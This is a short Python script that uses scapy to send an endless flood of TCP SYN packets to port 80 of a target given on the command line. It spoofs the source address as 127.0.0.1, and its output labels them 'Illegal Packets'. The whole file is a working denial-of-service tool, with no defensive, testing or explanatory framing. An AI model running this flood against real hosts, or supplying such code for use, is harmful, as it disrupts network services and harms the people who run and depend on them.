import sys
import scapy.all as scapy
from scapy.layers.inet import IP,TCP




dest = str(sys.argv[1])
packet = IP(dst=dest,src="127.0.0.1")/TCP(dport=80, flags="S") 
j = 0
while (1):
    i = 0
    print ("Iteration # ",j)
    for i in range(0,100):
        i = i + 1
        print("Sending Illegal Packets # ",i)
        scapy.send(packet)

    

 